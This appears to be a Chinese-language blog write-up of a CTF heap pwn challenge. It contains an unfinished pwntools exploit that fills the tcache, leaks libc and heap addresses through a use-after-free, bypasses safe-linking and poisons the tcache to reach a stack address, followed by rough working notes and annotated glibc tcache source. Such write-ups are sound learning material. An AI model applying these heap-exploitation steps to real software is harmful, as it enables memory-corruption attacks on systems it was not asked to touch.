---
title: easy_heap_img[寒假1_16]
date: 2026-03-03 02:18:27
tags: [CTF,PWN]
categories: [CTF,neuq]
---

题目什么的完全忘记了。。

慢慢看吧。。

#### exp半成品（到拿到栈地址）

```python
from pwn import*
filename = './chal'
libc = './libc.so.6'

e = ELF(filename)
libc = ELF(libc)
context(arch=e.arch,os=e.os)
context.log_level = 'debug'

sla = lambda x,s:p.sendlineafter(x,s)
sl = lambda s:p.sendline(s)
sa = lambda x,s:p.sendafter(x,s)
s = lambda s:p.send(s)

p = process(filename)
gdb.attach(p)
# p = remote()

def add (a,b):
    sla(b'> ',b'1')
    sla(b'> ',str(a))
    sla(b'> ',b)

def show (a):
    sla(b'> ',b'2')
    sla(b'> ',str(a))

def free (a):
    sla(b'> ',b'3')
    sla(b'> ',str(a))

pay = 0x10 * b'a'
pay = 0x100 * b'a'

add(0,pay)
add(1,pay)
add(2,pay)
add(3,pay)
add(4,pay)
add(5,pay)
add(6,pay)
add(7,pay)

add(8,pay)

pay = 0x100 * b'c'
add(10,pay)
pay = 0x100 * b'd'
add(11,pay)
pay = 0x100 * b'e'
add(12,pay)
pay = 0x100 * b'f'
add(13,pay)

free(0)
free(1)
free(2)
free(3)
free(4)
free(5)
free(6)
free(7)

show(7)

a_libc = u64(p.recv(8))



a_libc = a_libc - 0x203b20

print(hex(a_libc))

show(0)
a_heap = u64(p.recv(8))

show(1)
b_heap = u64(p.recv(8))

c_heap = b_heap^a_heap 

c_heap = c_heap - 0x2a0

print(hex(a_heap))
print(hex(b_heap))
print(hex(c_heap))
pause()

pay = 0x100 * b'a'
add(9,pay)

libc_stack = a_libc + 0x2046e0 

heap_9 = c_heap + 0x8f0

free(10)
free(11)
free(12)

add(20,pay)
add(21,pay)
add(22,pay)
add(23,pay)

heap_fd = c_heap + 0xe50
fd = libc_stack^(heap_fd >> 12)

pay = 0x100 * b'g' + p64(0xa) + p64(0x111) + p64(fd) + 0xe8 * b'g'

add(14,pay)

# free(11)
free(12)
free(14)

pay = pay + 0x10 *b'q'

add(14,pay)

pay = 0x100 * b'a'
add(15,pay)
add(16,pay)
free(15)

show(15)
leaked_fd = u64(p.recv(8))

heap_15 = c_heap + 0xe50

k1 = heap_15 >> 12
k2 = libc_stack >> 12

aaa = leaked_fd^k1^k2

print(hex(aaa))

p.interactive()
```

#### 过程（草稿）

首先申请八个堆块

前七个起到一个填充tcachebins的作用

然后在这个单链表的末尾有这个libc地址

这个第八个堆块的作用是使第七个堆块在show的时候能看到libc地址

如果没有这个第八个堆块的话第七个堆块在free之后show的话只会出现在申请的时候填充进去的垃圾数据（什么长难句）

（其实这段的原理关于为什么只申请七个chunk为什么不行我没有特别搞懂嗯但是这个思路可行）

这个二进制文件看起来倒是蛮方便

不用一个函数一个函数地翻

在申请堆块时，堆块的大小由堆块的时候写进去的字符串决定

现在实现了uaf

写得一卡一卡的

现在的目的是把栈地址放到堆上然后就能通过往堆里写东西实际上是在往栈上写东西（？）

呃我没看懂hint

现在的情况是触发了双向链表的报错

哎不对怎么是双向链表hint里不是这样的我不会写错了吧。

好像unlink

但是触发方式好像又不一样

嗯

wc我不会写不出来吧。。

哦哦这里要用到tcache

哦哦难怪

难怪

```python
add(9,pay)

free(8)
free(9)

pay = 0x110 * b'b'
add(8,pay)
pay = 0x110 * b'c'
add(10,pay)

free(9)

add(8,pay)

# pay = p64(a_libc)
pause()
pay = 0x110 * b'd'
add(11,pay)
```

这样之后9和10就会控制同一块堆块

（因为我show9和10show出来是一样的（

然后可以通过free再add来控fd

然后就是绕过那个什么异或了

Tcache 密钥机制

```c
#if USE_TCACHE
/* 最大64个bins */
#define TCACHE_MAX_BINS 64  
#define MAX_TCACHE_SIZE tidx2usize (TCACHE_MAX_BINS-1)
#define tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)
#define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
#define usize2tidx(x) csize2tidx (request2size (x))
/* 每个bins最多缓存7个chunk */
#define TCACHE_FILL_COUNT 7
#endif

typedef struct tcache_entry {
  struct tcache_entry *next;
} tcache_entry;
 /*
 *  tcache_entry 用于链接空闲的 chunk 结构体，其中的 next 指针指向下一个大小相同的 chunk。
 *  需要注意的是这里的 next 指向 chunk 的 user_data ，而 fastbin 的 fd 指向 chunk 开头(prev_size)的地址。
 *  而且，tcache_entry 会复用空闲 chunk 的 user_data 部分。
 */


// tcache_perthread_struct位于堆的开头，大小为0x250。  
typedef struct tcache_perthread_struct {
  char counts[TCACHE_MAX_BINS];              //用于存放bins中的chunk数量。
  tcache_entry *entries[TCACHE_MAX_BINS];    //用于存放64个bins地址
} tcache_perthread_struct;

static __thread tcache_perthread_struct *tcache = NULL;
 /* 
 *    每个 thread 都会维护一个 tcache_perthread_struct，一共有 TCACHE_MAX_BINS 个计数器和 TCACHE_MAX_BINS 项 tcache_entry,
 *  ·tcache_entry 用单向链表的方式链接了相同大小的处于空闲状态（free后）的 chunk。
 *  ·counts 记录了 tcache_entry 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk。
 */
```

marktext在哪调字体大小啊

ctrl + ,

调出来设置

不是我怎么找不到libc_argv啊

通过chunk0和chunk1的fd异或出来堆地址

然后现在只需要稍加计算就可以拿到栈地址了

对吧

哦不对还是得那个什么覆盖什么chunk什么东西嗯

嘿嘿嘿嘿嘿马上就写出来了捏

拿到栈地址了（泣）
